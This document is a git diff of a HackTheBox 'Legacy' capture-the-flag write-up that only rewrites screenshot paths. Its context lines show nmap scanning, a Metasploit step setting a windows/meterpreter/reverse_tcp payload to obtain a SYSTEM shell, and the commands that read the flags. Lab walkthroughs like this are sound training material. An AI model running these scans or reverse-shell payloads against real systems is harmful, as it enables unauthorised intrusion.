@@ -34,7 +34,7 @@ Verify if the host is alive using ICMP:
 ping -c 1 10.10.10.4
 ```
 
-![](GitHubv2/HackTheBox/EASY/Legacy/screenshots/ping.png)
+![](screenshots/ping.png)
 
 The host responds, confirming it is reachable.
 
@@ -54,7 +54,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.4 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![](GitHubv2/HackTheBox/EASY/Legacy/screenshots/allports.png)
+![](screenshots/allports.png)
 
 Extract open ports:
 
@@ -62,7 +62,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![](GitHubv2/HackTheBox/EASY/Legacy/screenshots/extractports.png)
+![](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -83,7 +83,7 @@ Let's check the result:
 cat targeted -l java
 ```
 
-![](GitHubv2/HackTheBox/EASY/Legacy/screenshots/targeted.png)
+![](screenshots/targeted.png)
 
 **Findings:**
 
@@ -124,7 +124,7 @@ set payload windows/meterpreter/reverse_tcp
 exploit
 ```
 
-![](GitHubv2/HackTheBox/EASY/Legacy/screenshots/exploit_run.png)
+![](screenshots/exploit_run.png)
 
 ✅ We obtain a shell with SYSTEM privileges.
 
@@ -139,7 +139,7 @@ The user flag is saved in `john` user inside the `Documents and Settings`directo
 type C:\Documents and Settings\john\Desktop\user.txt
 ```
 
-![](GitHubv2/HackTheBox/EASY/Legacy/screenshots/user_flag.png)
+![](screenshots/user_flag.png)
 
 ✅ **User flag obtained**
 
@@ -152,7 +152,7 @@ We are root, so we can go to `Administrator` directory for the root flag:
 type C:\Documents and Settings\Administrator\Desktop\root.txt
 ```
 
-![](GitHubv2/HackTheBox/EASY/Legacy/screenshots/root_flag.png)
+![](screenshots/root_flag.png)
 
 ✅ **Root flag obtained**
 
